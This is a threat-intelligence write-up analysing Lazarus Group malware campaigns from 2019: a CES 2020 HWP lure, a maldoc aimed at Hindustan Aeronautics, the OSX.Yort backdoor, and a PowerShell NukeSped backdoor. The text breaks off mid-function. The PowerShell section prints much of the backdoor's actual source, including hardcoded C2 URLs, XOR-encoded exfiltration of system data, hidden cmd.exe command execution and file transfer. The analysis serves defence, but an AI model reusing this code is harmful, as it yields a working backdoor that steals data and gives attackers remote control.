# A Look into the Lazarus Group's Operations in October 2019
## Table of Contents
* [Malware analysis](#Malware-analysis)
  + [CES 2020 incident (NukeSped)](#CES2020)
  + [HAL incident (JakyllHyde)](#HAL)
  + [OSX Malwares (OSX.Yort)](#OSX)
  + [Powershell Backdoor (PowerShell/NukeSped)](#Power)
  + [Nuclear's plant incident (DTrack)](#Dtrack) 
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
  + [CES 2020 incident (NukeSped)](#IOC-CES)
  + [HAL incident (JakyllHyde)](#IOC-HAL)
  + [OSX Malwares (OSX.Yort)](#IOC-OSX)
  + [Powershell Backdoor (PowerShell/NukeSped)](#IOC-Power)
  + [Nuclear's plant incident (DTrack)](#IOC-DTrack)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Knowledge Graph](#Knowledge)
* [Links](#Links)
  + [Originals Tweets](#Original-Tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [External analysis](#Analysis)
  + [Ressources](#Ressources)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The next analysis tries to keep the recent events and a logical improvement and technics of the group, this could go back in the past for comparing it.</h6>
<h3>CES 2020 incident (NukeSped)</h3><a name="CES2020"></a>
<h6>We can see that the document target specifically the south korean exhibitors with the following tittle "Application form for American Las Vegas CES 2020"</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/Doc.PNG" >
</p>
<h6> This initial vector of the infection begins by a current exploit in HWP (CVE-2015-6585) to execute an EPS script, this download and execute the next stage of the infection.</h6>
<p align="center">
  <img src="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/EPS.PNG">
</p>
<h6> This firstly executes a common trick RtlCaptureContext for having ability to register a top-level exception handler and avoid debugging.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_anti-debug.png">
</p>
<h6>Once this done, the malware execute a series of actions like list the disks, process, files and push it in differents files as temp file in waiting to send the data to C2.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_sysinfo.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_disks.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_finfFile.png">
</p>
<h6> The RAT push the cookie settings and Guid for the identification in the C2. </h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_pushguid.png">
</p>
<h6>This pushes the list of C2 address to contact, the languages to understand and begin the contact with the C2 in giving the host info.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_address.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/mal_Options.png">
</p>
<h6> List of the languages used :</h6>

|RFC4646/ISO 639 Ref|Lang|
|:-------------:|:-------------:|
|Az-Arab|Azerbaijani in Arabic script|
|de-CH|Swiss German|
|en-US|English as used in the United States|
<h6>Interesting to see that not only south korea language is chosen and show that the group target all exhibitors (more a hundred exhibitors only for South Korea). This thinks possibly that the group manage the event give hardware specifically for the shows to the customers, that explains why this to don't include specific language like South Korea. If the target is interesting for the group, this can execute command and other tools in the computer infected.</h6>

<h6> We can see in the list of all the domains used that this all as different cloud providers and are legit website hijacked by vulnerable wordpress.</h6>

|IP|ASN|Organization|Route|City|Coordinates|Country|
|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|
|64.151.229.52|AS26753|In2net Network Inc.|64.151.192.0/18|Toronto|43.6861,-79.4025|Canada|
|185.136.207.217|AS203377|LAB internet ve Bilisim Hizmetleri|185.136.207.0/24|Eskiehir|39.7767,30.5206|Turkey|
|83.169.17.240|AS8972|Europe GmbH|83.169.16.0/21|Köln|50.9541,6.9103|Germany|
<h6> We can confirmed it by the Whois records and by the certificats push on the websites know at all the sites have between up early August 2019 at September 2019.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/HWP-cert.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/HWP/HWP-whois.png">
</p>
<h3>HAL incident (JakyllHyde)</h3><a name="HAL"></a>
<h6>The document specifically targets the Hindustan Aeronautics Limited Company (HAL) that the national aeronautics in India. This use false announcements for recruitment for targets probably interesting profile or internal employees in asking for their opinion about announcements.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_cover.png">
</p>
<h6>The attack vector is an maldoc which use a macro for drop and execute the implant. The first bloc is a declaration of function for load the future extracted dll.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_1.png">
</p>
<h6>The next bloc has multiple functions like decode from the base 64 in binary and string, verify the path of the folder/file, create a folder and extract the correct payload from the form in maldoc according to the OS.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_2.png">
</p>
<h6>The following bloc has extraction functions (drop the lure) and for getting the name of the lure and the dll.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_3.png">
</p>
<h6> We can see the autoopen function for execute the macro at the opening of the document and the data of the malware in base 64.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_4.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/Maldoc_VBA_5.png">
</p>
<h6>The macro used is one of the macros available in the open source github tool "Macro_pack".</h6>
<h6>The backdoor begins to do the reconnaissance actions like lists the process, system informations(Username, ComputerName ...)</h6> 
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_process.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_systeminfos.png">
</p>
<h6>After this list all the disks on the computer and all the files in current working directories in waiting the order of the C2.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_disk.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getinfos.png">
</p>
<h6>This has the possibility to intercepts keystrokes (push it in temporary file), make screenshots, send interesting files by stream of bytes data.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_keyboard.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getscreenshot.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_getimage.png">
</p>
<h6>If the attacker wants, this can push and remove the persistence performed by a Startup key.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_writeKey.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_pushpersistence.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/mal_deletekey.png">
</p>
<h6>The backdoor contacts the following IP :</h6>

|IP|ASN|Organization|Route|City|Coordinates|Country|
|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|:-------------:|
|193.70.64.163|AS16276|thetiscloud.it|193.70.0.0/17| San Donato Milanese|45.4105,9.2684|Italy|
<h6>By the certificates, we can see that the website is up since 2018, seems be a legit website hijacked.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19/MAL-Cert.png">
</p>
<h6>Like the last incident, Lazarus group try to get high technologies, this possible that the interest is the fact that HAL is in cooperation for product and use the new french military aircraft (Rafale) in the India country.</h6>

<h3>OSX Malwares (OSX.Yort)</h3><a name="OSX"></a>
<h6>The initial vector of the infection is a maldoc with a VBA macro, this has two sections one for infected MacOSX and one for Windows. We can see the declaration of the functions for MacOSX and one of four spitted functions for getting the payload on the Windows version.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Maldoc-VBA-1.PNG">
</p>
<h6>Here, we can observe the initiation of the payloads according with the OS in the AutoOpen (Run a macro when Excel or Word document is open).</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Maldoc-VBA-2.PNG">
</p>
<h6>The backdoor consists of a single loop which loads the configuration and creates a session for waiting the orders of the C2. The configuration can be update and the malware can be sleep for a delay given by the C2.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-main.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-mainloop.png">
</p>
<h6>Many functions for sending and get data are derived from a common based code with a specific action as perform at the final.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/functionscom.PNG">
</p>
<h6>For each of them, this initiates and pushes the parameters for communicate with the C2.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-weboptions.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_option.png">
</p>
<h6>This can reply to the C2 like a pulse for alert at is still up (ReplyDie), download a file (ReplyDown), download and execute a file (ReplyExec), execute a command (Replycmd) or open another CLI (ReplyOtherShellCmd).</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-replydie.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyDown.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyExec.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-Replycmd.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-ReplyOtherShellCmd.png">
</p>
<h6>We can see on the data pushed on the C2 that a xor is performed with the ```"0xAA"``` value.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-Pushdata.png">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-xor.png">
</p>
<h6>The malware doesn't have a persistence but by the fact that can execute command, the attacker can decide push a persistence if this necessary, a function is performed when the attack close the session for return that the backdoor is correctly closed.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/march%202019/Mal-destroysession.png">
</p>
 <h6>This is according with the Kaspersky analysis of Yort on the functions of the backdoor:</h6>
 <ul> 
	 <li> Set sleep time (delay between C2 interactions)</li>
	 <li> Exit session</li>
	 <li> Collect basic host information</li>
	 <li> Check malware status</li>
	 <li> Show current malware configuration</li>
	 <li> Update malware configuratiov
	 <li> Execute system shell command</li>
	 <li> Download & Upload files</li>
</ul>

<h6>Another sample of Yort has been spotted with a reedited installer of Flash Player, on the strings. We can observed that is the version 10.2 that is rebuilt.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_version.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_version2.PNG">
</p>
<h6>We can see in the main function that install the legit Flash player, the checker software for the updates for avoid to become suspicious to the user and launch the backdoor.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_entry.png">
</p>
<h6>This loading the configuration and options of the Yort, the rest is the same that the previous sample of Yort.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_Command.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/North%20Korea/APT/Lazarus/23-10-19/Analysis/27-10-19-Maldoc2/Mal_option.png">
</p>
<h3>Powershell Backdoor (PowerShell/NukeSped)</h3><a name="Power"></a>
<h6>Now, see the Windows version, this use Powershell language for the backdoor, the first bloc of the malware is the global values for the configuration, list of URL to contact and control values.</h6>

``` powershell
$global:breakvalue=1
$global:mbz=132608
$global:tid=0
$global:url="https://crabbedly.club/board.php","https://craypot.live/board.php","https://indagator.club/board.php"
$global:nup=0
$global:nwct=0
``` 
<h6>The backdoor executes a while loop until that the order to destroy the session push to the value of the variable "breakvalue" at 0.</h6>

``` powershell
function main()
{
	$global:tid=Get-Random -Minimum 128 -Maximum 16383
	while($global:breakvalue)
	{
		Try
		{
			if($global:nwct -gt 0){$global:nwct=$global:nwct- 1}
			if($global:nwct -le 0){ if (PulsetoC2(16) -eq $true){Start-Sleep -s 4; command($global:url[$global:nup])} }
		}
		Catch{}
		if($global:breakvalue -ne 1){break}
		Start-Sleep -s 60
	}
}
try{Remove-Item -Path $MyInvocation.MyCommand.Source}catch{}
main
``` 

<h6>In function of the result of the id push by the C2, this executes the following actions in the infected computer.</h6>

``` powershell
function command($url)
{
	try
	{
		while($global:breakvalue)
		{
			$rq=PushDatatoC2 $global:tid 22 $null 0 $global:url[$global:nup]
			if($rq -eq $null){break}
			$basefunctions=DecryptC2Data $rq $global:mbz
			if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
			$nmsg=ConverttoInt32 $basefunctions 0
			$nmlen=ConverttoInt32 $basefunctions 8
			if($basefunctions.length -ne ($nmlen+12)){break}
			$cres=0
			if($nmsg -eq 2){$cres=slp $basefunctions}
			elseif($nmsg -eq 3){$cres=diconnect}
			elseif($nmsg -eq 11){$cres=Set-SysInfo}
			elseif($nmsg -eq 12){$cres=kalv}
			elseif($nmsg -eq 14){$cres=Get-actions}
			elseif($nmsg -eq 15){$cres=Set-actions $basefunctions}
			elseif($nmsg -eq 18){$cres=Set-command $basefunctions}
			elseif($nmsg -eq 20){$cres=upload $basefunctions}
			elseif($nmsg -eq 21){$cres=download $basefunctions}
			elseif($nmsg -eq 24){$cres=launch_process $basefunctions}
			else{break}
			if($cres -eq 0){break}
			Start-Sleep -s 1
		}
		Start-Sleep -s 4
		if(PulsetoC2(17) -eq $true){}
	}
	catch{}
}

``` 

<h6>The next bloc content the functions for copy the bytes and convert from different encoding the data.</h6>

``` powershell
function CopyBytes($DatatoCopy,$dst,$dstOffset)
{
	$Bytes=[System.BitConverter]::GetBytes($DatatoCopy)
	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
}
function CopyBytes_UTF8($DatatoCopy,$dst,$dstOffset)
{
	$Bytes=[System.Text.ASCIIEncoding]::UTF8.GetBytes($DatatoCopy)
	return [System.Buffer]::BlockCopy($Bytes,0,$dst,$dstOffset,$Bytes.length)
}
function ConverttoInt32($buffer,$Offset){ return [System.BitConverter]::ToInt32($buffer,$Offset) }
function Get_UTF8Bytes($Data){ return [System.Text.ASCIIEncoding]::UTF8.GetBytes($Data) }
``` 

<h6>The following functions are for sending and get the data from the C2. We can note that the user agent is the same that the MacOS backdoor.</h6>

``` powershell
function senddata($tid,$rid,$array_data,$DatatoC2_Length,$url)
{
	try
	{
		if($array_data -eq $null){$array_data=New-Object byte[] 0}
		$ID=-join((48..57)|Get-Random -Count 12|%{[char]$_}) #10 random numbers
		$filename=-join((48..57)|Get-Random -Count 12|%{[char]$_})+".dat" # LIKE 5216804379.dat by example
		$date_msg="--" + (Get-Date -Format yyyy-MM-dd-hh-mm-ss-fffffff) + "--"
		$netobject=[System.Net.WebRequest]::create($url + "?v=" + $ID)
		$netobject.Method="POST"
		$netobject.ContentType="multipart/form-data; boundary=$date_msg"
		$netobject.TimeOut=120000
		$netobject.ReadWriteTimeout=120000
		$netobject.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
		$pbdy=Get_UTF8Bytes("`r`n`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_f`"`r`n`r`n" + $tid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"_webident_s`"`r`n`r`n" + $rid + "`r`n--" + $date_msg + "`r`nContent-Disposition: form-data; name=`"file`"; filename=`"" + $filename + "`"`r`nContent-Type: octet-stream`r`n`r`n")
		$ebdy=Get_UTF8Bytes("`r`n--" + $date_msg + "`r`n")
		$netobject.ContentLength=$pbdy.Length + $DatatoC2_Length + $ebdy.Length;
		$StreamObject=$netobject.GetRequestStream()
		$StreamObject.Write($pbdy,0,$pbdy.Length)
		$StreamObject.Flush()
		if($DatatoC2_Length -gt 0)
		{
			$StreamObject.Write($array_data,0,$DatatoC2_Length)
			$StreamObject.Flush()
		}
		$StreamObject.Write($ebdy,0,$ebdy.Length)
		$StreamObject.Flush()
		$StreamObject.Close()
		return $netobject
	}
	catch{return $null}
}
function GetResponseC2($netobject,$mxz)
{
	try
	{
		$response=$netobject.GetResponse()
		if($response.StatusCode -eq "OK")
		{
			$stream=$response.GetResponseStream()
			$byteobject=New-Object byte[] $mxz
			$val=0
			$response_length=$byteobject.Length
			if($response_length -gt $response.ContentLength){$response_length=$response.ContentLength}
			while($val -lt $response_length)
			{
			$dataread=$stream.Read($byteobject,$val,$response_length-$val)
			if($dataread -le 0){break}
			$val=$val+$dataread
			}
			if($val -ne 0)
			{
				if($val -eq 1){$byteobject2=New-Object byte[] 2}
				else
				{
					$byteobject2=New-Object byte[] $val}
					[System.Buffer]::BlockCopy($byteobject,0,$byteobject2,0,$val)
			}
			else{$byteobject2=New-Object byte[] 2}
			$response.Close()
			$r.Close()
			$r.Dispose()
			return $byteobject2
		}
		else{return $null} 
	}
	catch{return $null}
}
```

###### The both next functions use the same XOR value ```"0xAA"``` for encrypt and decrypt data from the C2. We can note again that the same XOR value that in the MacOS backdoor.

``` powershell
function PushDatatoC2($tid,$rid,$bd,$DatatoC2_Length,$url)
{
	if($DatatoC2_Length -gt 0){ for($i=0;$i -lt $DatatoC2_Length; $i++){$bd[$i]=$bd[$i] -bxor 0xAA} }
	return senddata $tid $rid $bd $DatatoC2_Length $url
}
function DecryptC2Data($netobject,$mxz)
{
	$DataC2=GetResponseC2 $netobject $mxz
	if($DataC2 -ne $null){for($i=0; $i -lt $DataC2.length; $i++){ $DataC2[$i] = $DataC2[$i] -bxor 0xAA }}
	return $DataC2
}
```

###### Like the MacOS backdoor, we observe that the back has multiple mods for communicate with the C2 and depends of the initial reply of the C2.

``` powershell
function updatemod1()
{
	$trigger=0
	do
	{
		$byteobject=New-Object byte[] 12
		CopyBytes 5 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 0 $byteobject 8
		$response=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
		if($response -eq $null){break}
		$byteobject=DecryptC2Data $response $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
		$trigger=1
	}while($false)
	return $trigger
}
function updatemod2()
{
	$trigger=0
	do
	{

		$byteobject=New-Object byte[] 16
		CopyBytes 4 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 4 $byteobject 8
		CopyBytes 0 $byteobject 12
		$rq=PushDatatoC2 $global:tid 21 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -ne 2)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function updatemod3($nmsg)
{
	$trigger=0
	do
	{

		$byteobject=New-Object byte[] 12
		CopyBytes $nmsg $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 0 $byteobject 8
		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
		$nmsg=ConverttoInt32 $byteobject 0
		$nmlen=ConverttoInt32 $byteobject 8
		if($byteobject.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
```

<h6>This has the possibility to set in standby the backdoor, close the current session and get the system informations.</h6>

``` powershell
function slp($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		if($nmlen -ne 4){break}
		$global:nwct=ConverttoInt32 $buf 12
		$trigger=updatemod1
		$trigger=0
	} while($false)
	return $trigger
}
function disconnect()
{
	$trigger=0
	do
	{
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
		$global:breakvalue=0
	} while($false)
	return $trigger
}
function Set-SysInfo()
{
	$trigger=0
	do
	{
		$hostnamename=$env:COMPUTERNAME
		$ip=(Test-Connection -ComputerName $hostname -Count 1  | Select -ExpandProperty IPV4Address).Address
		$OS=[System.Environment]::OSVersion.Version
		$OS_major=$OS.major
		$OS_minor=$OS.minor
		$byteobject=New-Object byte[] 300
		CopyBytes 11 $byteobject 0
		CopyBytes 0 $byteobject 4
		CopyBytes 288 $byteobject 8
		CopyBytes_UTF8 $hostname $byteobject 12
		CopyBytes $ip $byteobject 272
		CopyBytes 1 $byteobject 276
		CopyBytes $OS_major $byteobject 280
		CopyBytes $OS_minor $byteobject 284
		CopyBytes 3 $byteobject 288
		CopyBytes 0 $byteobject 292
		CopyBytes 6 $byteobject 296
		$rq=PushDatatoC2 $global:tid 20 $byteobject $byteobject.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$byteobject=DecryptC2Data $rq $global:mbz
		if(($byteobject -eq $null) -or ($byteobject.length -lt 12)){break}
		$nmsg=ConverttoInt32 $byteobject 0
		$nmlen=ConverttoInt32 $byteobject 8
		if($byteobject.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
```

<h6>This can get the actions and push the actions to do on the system.</h6>

``` powershell

function Get-actions()
{
	$trigger=0
	do
	{
		$nmsg=14
		$nrsv=0
		$nmlen=2152
		$basefunctions=New-Object byte[] 2164
		CopyBytes $nmsg $basefunctions 0
		CopyBytes $nrsv $basefunctions 4
		CopyBytes $nmlen $basefunctions 8
		for($i=0;$i -lt $global:url.length;$i++){CopyBytes_UTF8 $global:url[$i] $basefunctions (84+260*$i)}
		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
		if($rq -eq $null){break}
		$basefunctions=DecryptC2Data $rq $global:mbz
		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){break}
		$nmsg=ConverttoInt32 $basefunctions 0
		$nmlen=ConverttoInt32 $basefunctions 8
		if($basefunctions.length -ne ($nmlen+12)){break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){break}
		$trigger=1
	} while($false)
	return $trigger
}
function Set-actions($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		if($nmlen -ne 2152){break}
		for($i=0;$i -lt $global:url.length;$i++)
		{
			$js=0
			for($js=0;$js -lt 260;$js++){if($buf[(84+260*$i)+$js] -eq 0){break}}
			$global:url[$i] = [System.Text.ASCIIEncoding]::UTF8.GetString($buf, (84+260*$i), $js)
		}
		$trigger=updatemod1
		if($trigger -eq 0){break}
		$trigger=1
	} while($false)
	return $trigger
}
```

<h6>The attacker can perform a specific action in another CLI.</h6>

``` powershell
function Set-command($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$arg=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$path=[System.IO.Path]::GetTempFileName()
		$process = New-Object System.Diagnostics.Process
		$pif = New-Object System.Diagnostics.ProcessStartInfo
		$pif.FileName="cmd.exe"
		$pif.CreateNoWindow=$true;
		$pif.WindowStyle="Hidden";
		$pif.Arguments="/c "+$arg+" >"+$path+" 2>&1"
		$process.StartInfo=$pif
		$process.Start() | Out-Null
		$srs=""
		$count=0
	while ($process.HasExited -eq $false)
	{
		if($count -gt 24){break}
		$count=$count+1
		Start-Sleep -s 1
	}
	if([System.IO.File]::Exists($path))
	{
		try
		{
            $content=Get-Content -Path $path; 
            Remove-Item -Path $path;
			if($content.GetType().FullName -eq "System.Object[]")
			{
				for($i=0;$i -lt $content.Length; $i++){$srs=$srs+$content[$i]+"`r`n"}
			}
			else{$srs=$content}
		}
		catch{$srs=""}
	}
	$srsb=Get_UTF8Bytes($srs)
	$trigger= updatemod3 5
	if($trigger -eq 0){break}
	$srsb=Get_UTF8Bytes($srs)
	$ncr=0
	$trigger=1
	while($ncr -lt $srsb.length)
	{
		$ncrs=1024*100
		if($ncrs -gt ($srsb.length-$ncr)){$ncrs=($srsb.length-$ncr)}
		$nmlen=$ncrs
		$basefunctions=New-Object byte[] (12+$ncrs)
		CopyBytes 16 $basefunctions 0
		CopyBytes 0 $basefunctions 4
		CopyBytes $nmlen $basefunctions 8
		for($i=0;$i -lt $ncrs;$i++){$basefunctions[12+$i]=$srsb[$ncr+$i]}
		$rq=PushDatatoC2 $global:tid 20 $basefunctions $basefunctions.Length $global:url[$global:nup]
		if($rq -eq $null){$trigger=0;break}
		$basefunctions=DecryptC2Data $rq $global:mbz
		if(($basefunctions -eq $null) -or ($basefunctions.length -lt 12)){$trigger=0;break}
		$nmsg=ConverttoInt32 $basefunctions 0
		$nmlen=ConverttoInt32 $basefunctions 8
		if($basefunctions.length -ne ($nmlen+12)){$trigger=0;break}
		if(($nmlen -ne 0) -or ($nmsg -ne 5)){$trigger=0;break}
		$ncr=$ncr+$ncrs
		}
		if($trigger -eq 0){break}
		$trigger=updatemod3 17
		if($trigger -eq 0){break}
		$trigger=1
	}while($false)
	return $trigger
}
```

<h6>Finally, this can download and upload files on the C2, send a pulse to the C2, push a trigger and launch a new process (like push an additional tool).</h6>

``` powershell
function upload($buf)
{
	$trigger=0
	do
	{
		$nmlen=ConverttoInt32 $buf 8
		$path=[System.Text.ASCIIEncoding]::UTF8.GetString($buf,12,$nmlen)
		$fs=$null
		try{$fs=[System.IO.File]::Open($path, [System.IO.FileMode]::Append)}catch{$fs=$null}
